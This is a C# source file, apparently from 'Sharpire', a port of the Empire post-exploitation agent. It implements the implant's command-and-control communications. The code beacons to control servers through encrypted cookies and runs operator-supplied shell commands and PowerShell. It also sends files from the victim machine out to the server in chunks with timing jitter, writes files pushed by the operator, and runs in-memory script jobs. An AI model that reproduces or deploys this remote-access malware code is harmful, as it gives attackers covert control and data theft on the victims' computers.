using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;

namespace Sharpire
{
    class Coms
    {
        private SessionInfo sessionInfo;

        internal int MissedCheckins { get; set; }
        private int ServerIndex = 0;

        private JobTracking jobTracking;

        ////////////////////////////////////////////////////////////////////////////////
        // Default Constructor
        ////////////////////////////////////////////////////////////////////////////////
        internal Coms(SessionInfo sessionInfo)
        {
            this.sessionInfo = sessionInfo;
        }

        ////////////////////////////////////////////////////////////////////////////////
        private byte[] NewRoutingPacket(byte[] encryptedBytes, int meta)
        {
            int encryptedBytesLength = 0;
            if (encryptedBytes != null && encryptedBytes.Length > 0)
            {
                encryptedBytesLength = encryptedBytes.Length;
            }

            byte[] data = Encoding.ASCII.GetBytes(sessionInfo.GetAgentID());
            data = Misc.combine(data, new byte[4] { 0x01, Convert.ToByte(meta), 0x00, 0x00 });
            data = Misc.combine(data, BitConverter.GetBytes(encryptedBytesLength));

            byte[] initializationVector = NewInitializationVector(4);
            byte[] rc4Key = Misc.combine(initializationVector, sessionInfo.GetStagingKeyBytes());
            byte[] routingPacketData = EmpireStager.rc4Encrypt(rc4Key, data);

            routingPacketData = Misc.combine(initializationVector, routingPacketData);
            if (encryptedBytes != null && encryptedBytes.Length > 0)
            {
                routingPacketData = Misc.combine(routingPacketData, encryptedBytes);
            }

            return routingPacketData;
        }

        ////////////////////////////////////////////////////////////////////////////////
        internal void DecodeRoutingPacket(byte[] packetData, ref JobTracking jobTracking)
        {
            this.jobTracking = jobTracking;

            if (packetData.Length < 20)
            {
                return;
            }
            int offset = 0;
            while (offset < packetData.Length)
            {
                byte[] routingPacket = packetData.Skip(offset).Take(20).ToArray();
                byte[] routingInitializationVector = routingPacket.Take(4).ToArray();
                byte[] routingEncryptedData = packetData.Skip(4).Take(16).ToArray();
                offset += 20;

                byte[] rc4Key = Misc.combine(routingInitializationVector, sessionInfo.GetStagingKeyBytes());

                byte[] routingData = EmpireStager.rc4Encrypt(rc4Key, routingEncryptedData);
                string packetSessionId = Encoding.UTF8.GetString(routingData.Take(8).ToArray());
                try
                {
                    byte language = routingPacket[8];
                    byte metaData = routingPacket[9];
                }
                catch (IndexOutOfRangeException) { }

                byte[] extra = routingPacket.Skip(10).Take(2).ToArray();
                uint packetLength = BitConverter.ToUInt32(routingData, 12);

                if (packetLength < 0)
                {
                    break;
                }

                if (sessionInfo.GetAgentID() == packetSessionId)
                {
                    byte[] encryptedData = packetData.Skip(offset).Take(offset + (int)packetLength - 1).ToArray();
                    offset += (int)packetLength;
                    try
                    {
                        ProcessTaskingPackets(encryptedData);
                    }
                    catch (Exception) { }
                }
            }
        }

        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        internal byte[] GetTask()
        {
            byte[] results = new byte[0];
            try
            {
                byte[] routingPacket = NewRoutingPacket(null, 4);
                string routingCookie = Convert.ToBase64String(routingPacket);

                WebClient webClient = new WebClient();
                webClient.Proxy = WebRequest.GetSystemWebProxy();
                webClient.Proxy.Credentials = CredentialCache.DefaultCredentials;
                webClient.Headers.Add("User-Agent", sessionInfo.GetUserAgent());
                webClient.Headers.Add("Cookie", "session=" + routingCookie);

                Random random = new Random();
                string selectedTaskURI = sessionInfo.GetTaskURIs()[random.Next(0, sessionInfo.GetTaskURIs().Length)];
                results = webClient.DownloadData(sessionInfo.GetControlServers()[ServerIndex] + selectedTaskURI);
            }
            catch (WebException webException)
            {
                MissedCheckins++;
                if ((int)((HttpWebResponse)webException.Response).StatusCode == 401)
                {
                    //Restart everything
                }
            }
            return results;
        }

        ////////////////////////////////////////////////////////////////////////////////
        ////////////////////////////////////////////////////////////////////////////////
        internal void SendMessage(byte[] packets)
        {
            Console.WriteLine("Sending");
            byte[] ivBytes = NewInitializationVector(16);
            byte[] encryptedBytes = new byte[0];
            using (AesCryptoServiceProvider aesCrypto = new AesCryptoServiceProvider())
            {
                aesCrypto.Mode = CipherMode.CBC;
                aesCrypto.Key = sessionInfo.GetSessionKeyBytes();
                aesCrypto.IV = ivBytes;
                ICryptoTransform encryptor = aesCrypto.CreateEncryptor();
                encryptedBytes = encryptor.TransformFinalBlock(packets, 0, packets.Length);
            }
            encryptedBytes = Misc.combine(ivBytes, encryptedBytes);

            HMACSHA256 hmac = new HMACSHA256();
            hmac.Key = sessionInfo.GetSessionKeyBytes();
            byte[] hmacBytes = hmac.ComputeHash(encryptedBytes).Take(10).ToArray();
            encryptedBytes = Misc.combine(encryptedBytes, hmacBytes);

            byte[] routingPacket = NewRoutingPacket(encryptedBytes, 5);

            Random random = new Random();
            string controlServer = sessionInfo.GetControlServers()[random.Next(sessionInfo.GetControlServers().Length)];

            if (controlServer.StartsWith("http"))
            {
                WebClient webClient = new WebClient();
                webClient.Proxy = WebRequest.GetSystemWebProxy();
                webClient.Proxy.Credentials = CredentialCache.DefaultCredentials;
                webClient.Headers.Add("User-Agent", sessionInfo.GetUserAgent());
                //Add custom headers
                try
                {
                    string taskUri = sessionInfo.GetTaskURIs()[random.Next(sessionInfo.GetTaskURIs().Length)];
                    byte[] response = webClient.UploadData(controlServer + taskUri, "POST", routingPacket);
                }
                catch (WebException) { }
            }

        }

        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        private void ProcessTaskingPackets(byte[] encryptedTask)
        {
            byte[] taskingBytes = EmpireStager.aesDecrypt(sessionInfo.GetSessionKey(), encryptedTask);
            PACKET firstPacket = DecodePacket(taskingBytes, 0);
            byte[] resultPackets = processTasking(firstPacket);
            SendMessage(resultPackets);

            int offset = 12 + (int)firstPacket.length;
            string remaining = firstPacket.remaining;
        }

        ////////////////////////////////////////////////////////////////////////////////
        //The hard part
        ////////////////////////////////////////////////////////////////////////////////
        private byte[] processTasking(PACKET packet)
        {
            byte[] returnPacket = new byte[0];
            try
            {
                //Change this to a switch : case
                int type = packet.type;
                switch (type)
                {
                    case 1:
                        byte[] systemInformationBytes = EmpireStager.GetSystemInformation("0", "servername");
                        string systemInformation = Encoding.ASCII.GetString(systemInformationBytes);
                        return EncodePacket(1, systemInformation, packet.taskId);
                    case 2:
                        string message = "[!] Agent " + sessionInfo.GetAgentID() + " exiting";
                        SendMessage(EncodePacket(2, message, packet.taskId));
                        Environment.Exit(0);
                        //This is still dumb
                        return new byte[0];
                    case 40:
                        string[] parts = packet.data.Split(' ');
                        string output;
                        if (1 == parts.Length)
                            output = Agent.InvokeShellCommand(parts.FirstOrDefault(), "");
                        else
                            output = Agent.InvokeShellCommand(parts.FirstOrDefault(), string.Join(" ",parts.Skip(1).Take(parts.Length - 1).ToArray()));
                        byte[] packetBytes = EncodePacket(packet.type, output, packet.taskId);
                        return packetBytes;
                    case 41:
                        return Task41(packet);
                    case 42:
                        return Task42(packet);
                    case 50:
                        List<string> runningJobs = new List<string>(jobTracking.jobs.Keys);
                        return EncodePacket(packet.type, runningJobs.ToArray(), packet.taskId);
                    case 51:
                        return Task51(packet);
                    case 100:
                        return EncodePacket(packet.type, Agent.RunPowerShell(packet.data), packet.taskId);
                    case 101:
                        return Task101(packet);
                    case 110:
                        string jobId = jobTracking.StartAgentJob(packet.data, packet.taskId);
                        return EncodePacket(packet.type, "Job started: " + jobId, packet.taskId);
                    case 111:
                        return EncodePacket(packet.type, "Not Implimented", packet.taskId);
                    case 120:
                        return Task120(packet);
                    case 121:
                        return Task121(packet);
                    default:
                        return EncodePacket(0, "Invalid type: " + packet.type, packet.taskId);
                }
            }
            catch (Exception error)
            {
                return EncodePacket(packet.type, "Error running command: " + error, packet.taskId);
            }
        }

        ////////////////////////////////////////////////////////////////////////////////
        internal byte[] EncodePacket(ushort type, string[] data, ushort resultId)
        {
            string dataString = string.Join("\n", data);
            return EncodePacket(type, dataString, resultId);
        }

        ////////////////////////////////////////////////////////////////////////////////
        // Check this one for UTF8 Errors
        ////////////////////////////////////////////////////////////////////////////////
        internal byte[] EncodePacket(ushort type, string data, ushort resultId)
        {
            Console.WriteLine(data);
            data = Convert.ToBase64String(Encoding.UTF8.GetBytes(data));
            byte[] packet = new byte[12 + data.Length];

            BitConverter.GetBytes((short)type).CopyTo(packet, 0);

            BitConverter.GetBytes((short)1).CopyTo(packet, 2);
            BitConverter.GetBytes((short)1).CopyTo(packet, 4);

            BitConverter.GetBytes((short)resultId).CopyTo(packet, 6);

            BitConverter.GetBytes(data.Length).CopyTo(packet, 8);
            Encoding.UTF8.GetBytes(data).CopyTo(packet, 12);

            return packet;
        }

        ////////////////////////////////////////////////////////////////////////////////
        // Working
        ////////////////////////////////////////////////////////////////////////////////
        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        public struct PACKET
        {
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
            public ushort type;
            public ushort totalPackets;
            public ushort packetNumber;
            public ushort taskId;
            public uint length;
            public string data;
            public string remaining;
        };

        ////////////////////////////////////////////////////////////////////////////////
        // 
        ////////////////////////////////////////////////////////////////////////////////
        private PACKET DecodePacket(byte[] packet, int offset)
        {
            PACKET packetStruct = new PACKET();
            packetStruct.type = BitConverter.ToUInt16(packet, 0 + offset);
            packetStruct.totalPackets = BitConverter.ToUInt16(packet, 2 + offset);
            packetStruct.packetNumber = BitConverter.ToUInt16(packet, 4 + offset);
            packetStruct.taskId = BitConverter.ToUInt16(packet, 6 + offset);
            packetStruct.length = BitConverter.ToUInt32(packet, 8 + offset);
            int takeLength = 12 + (int)packetStruct.length + offset - 1;
            byte[] dataBytes = packet.Skip(12 + offset).Take(takeLength).ToArray();
            packetStruct.data = Encoding.UTF8.GetString(dataBytes);
            byte[] remainingBytes = packet.Skip(takeLength).Take(packet.Length - takeLength).ToArray();
            packet = null;
            return packetStruct;
        }

        ////////////////////////////////////////////////////////////////////////////////
        // Working
        ////////////////////////////////////////////////////////////////////////////////
        internal static byte[] NewInitializationVector(int length)
        {
            Random random = new Random();
            byte[] initializationVector = new byte[length];
            for (int i = 0; i < initializationVector.Length; i++)
            {
                initializationVector[i] = Convert.ToByte(random.Next(0, 255));
            }
            return initializationVector;
        }

        ////////////////////////////////////////////////////////////////////////////////
        // Download File from Agent
        ////////////////////////////////////////////////////////////////////////////////
        public byte[] Task41(PACKET packet)
        {
            try
            {
                int chunkSize = 512 * 1024;
                string[] packetParts = packet.data.Split(' ');
                string path = "";
                if (packetParts.Length > 1)
                {
                    path = string.Join(" ", packetParts.Take(packetParts.Length - 2).ToArray());
                    try
                    {
                        chunkSize = Convert.ToInt32(packetParts[packetParts.Length - 1]) / 1;
                        if (packetParts[packetParts.Length - 1].Contains('b'))
                        {
                            chunkSize = chunkSize * 1024;
                        }
                    }
                    catch
                    {
                        path += " " + packetParts[packetParts.Length - 1];
                    }
                }
                else
                {
                    path = packet.data;
                }
                path = path.Trim('\"').Trim('\'');
                if (chunkSize < 64 * 1024)
                {
                    chunkSize = 64 * 1024;
                }
                else if (chunkSize > 8 * 1024 * 1024)
                {
                    chunkSize = 8 * 1024 * 1024;
                }


                DirectoryInfo directoryInfo = new DirectoryInfo(path);
                FileInfo[] completePath = directoryInfo.GetFiles(path);

                int index = 0;
                string filePart = "";
                do
                {
                    byte[] filePartBytes = Agent.getFilePart(path, index, chunkSize);
                    filePart = Convert.ToBase64String(filePartBytes);
                    if (filePart.Length > 0)
                    {
                        string data = index.ToString() + "|" + path + "|" + filePart;
                        SendMessage(EncodePacket(packet.type, data, packet.taskId));
                        index++;
                        if (sessionInfo.GetDefaultDelay() != 0)
                        {
                            int max = (int)((sessionInfo.GetDefaultJitter() + 1) * sessionInfo.GetDefaultDelay());
                            if (max > int.MaxValue)
                            {
                                max = int.MaxValue - 1;
                            }

                            int min = (int)((sessionInfo.GetDefaultJitter() - 1) * sessionInfo.GetDefaultDelay());
                            if (min < 0)
                            {
                                min = 0;
                            }

                            int sleepTime;
                            if (min == max)
                            {
                                sleepTime = min;
                            }
                            else
                            {
                                Random random = new Random();
                                sleepTime = random.Next(min, max);
                            }
                            Thread.Sleep(sleepTime);
                        }
                        GC.Collect();
                    }
                } while (filePart.Length != 0);
                return EncodePacket(packet.type, "[*] File download of " + path + " completed", packet.taskId);
            }
            catch
            {
                return EncodePacket(packet.type, "[!] File does not exist or cannot be accessed", packet.taskId);
            }
        }

        ////////////////////////////////////////////////////////////////////////////////
        // Upload File to Agent
        ////////////////////////////////////////////////////////////////////////////////
        private byte[] Task42(PACKET packet)
        {
            Console.WriteLine(packet.data);
            string[] parts = packet.data.Split('|');
            if (2 > parts.Length)
                return EncodePacket(packet.type, "[!] Upload failed - No Delimiter", packet.taskId);

            string fileName = parts.First();
            string base64Part = parts[1];

            byte[] content;
            try
            {
                content = Convert.FromBase64String(base64Part);
            }
            catch(FormatException ex)
            {
                return EncodePacket(packet.type, "[!] Upload failed: " + ex.Message, packet.taskId);
            }

            try
            {
                using (FileStream fileStream = File.Open(fileName, FileMode.Create))
                {
                    using (BinaryWriter binaryWriter = new BinaryWriter(fileStream))
                    {
                        try
                        {
                            binaryWriter.Write(content);
                            return EncodePacket(packet.type, "[*] Upload of " + fileName + " successful", packet.taskId);
                        }
                        catch
                        {
                            return EncodePacket(packet.type, "[!] Error in writing file during upload", packet.taskId);
                        }
                    }
                }
            }
            catch
            {
                return EncodePacket(packet.type, "[!] Error in writing file during upload", packet.taskId);
            }
        }

        ////////////////////////////////////////////////////////////////////////////////
        // Kill Job
        ////////////////////////////////////////////////////////////////////////////////
        private byte[] Task51(PACKET packet)
        {
            try
            {
                string output = jobTracking.jobs[packet.data].GetOutput();
                if (output.Trim().Length > 0)
                {
                    EncodePacket(packet.type, output, packet.taskId);
                }
                Console.WriteLine(packet.taskId);
                jobTracking.jobs[packet.data].KillThread();
                return EncodePacket(packet.type, "Job " + packet.data + " killed.", packet.taskId);
            }
            catch
            {
                return EncodePacket(packet.type, "[!] Error in stopping job: " + packet.data, packet.taskId);
            }
        }

        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        public byte[] Task101(PACKET packet)
        {
            string prefix = packet.data.Substring(0, 15);
            string extension = packet.data.Substring(15, 5);
            string output = Agent.RunPowerShell(packet.data.Substring(20));
            return EncodePacket(packet.type, prefix + extension + output, packet.taskId);
        }

        ////////////////////////////////////////////////////////////////////////////////
        // Load PowerShell Script
        ////////////////////////////////////////////////////////////////////////////////
        public byte[] Task120(PACKET packet)
        {
            Random random = new Random();
            byte[] initializationVector = new byte[16];
            random.NextBytes(initializationVector);
            jobTracking.ImportedScript = EmpireStager.aesEncrypt(sessionInfo.GetSessionKeyBytes(), initializationVector, Encoding.ASCII.GetBytes(packet.data));
            return EncodePacket(packet.type, "Script successfully saved in memory", packet.taskId);
        }

        ////////////////////////////////////////////////////////////////////////////////
        // Run an Agent Job
        ////////////////////////////////////////////////////////////////////////////////
        public byte[] Task121(PACKET packet)
        {
            byte[] scriptBytes = EmpireStager.aesDecrypt(sessionInfo.GetSessionKey(), jobTracking.ImportedScript);
            string script = Encoding.UTF8.GetString(scriptBytes);
            string jobId = jobTracking.StartAgentJob(script + ";" + packet.data, packet.taskId);
            return EncodePacket(packet.type, "Job started: " + jobId, packet.taskId);
        }
    }
}